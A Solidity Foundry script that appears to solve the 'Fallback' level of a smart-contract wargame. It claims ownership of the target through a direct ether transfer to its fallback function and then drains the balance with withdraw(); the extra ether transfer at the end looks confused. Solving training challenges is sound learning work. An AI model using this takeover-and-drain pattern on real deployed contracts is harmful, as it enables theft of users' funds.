// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

/**
 * Objectives:
 *  1. Claim ownership of Fallback contract
 *  2. Drain all the funds
 */

interface Fallback {
    function contribute() external payable;
    function withdraw() external;
}

contract AttackFallback is Script {
    address constant FALLBACK_CONTRACT_ADDRESS = address(0x0); // TODO: Change for your instance address

    function run() public {
        vm.startBroadcast();
        Fallback fallbackContract = Fallback(FALLBACK_CONTRACT_ADDRESS);
        fallbackContract.contribute{value: 0.0001 ether}(); // Bypass first require
        (bool success,) = payable(FALLBACK_CONTRACT_ADDRESS).call{value: 0.0001 ether}("");
        require(success, "couldn't send ether to fallback contract");

        uint256 fallbackContractBalance = FALLBACK_CONTRACT_ADDRESS.balance;
        fallbackContract.withdraw();
        (bool withdrawCallSuccess,) = msg.sender.call{value: fallbackContractBalance}("");
        require(FALLBACK_CONTRACT_ADDRESS.balance == 0 && withdrawCallSuccess, "couldn't drain contract");

        vm.stopBroadcast();
    }
}
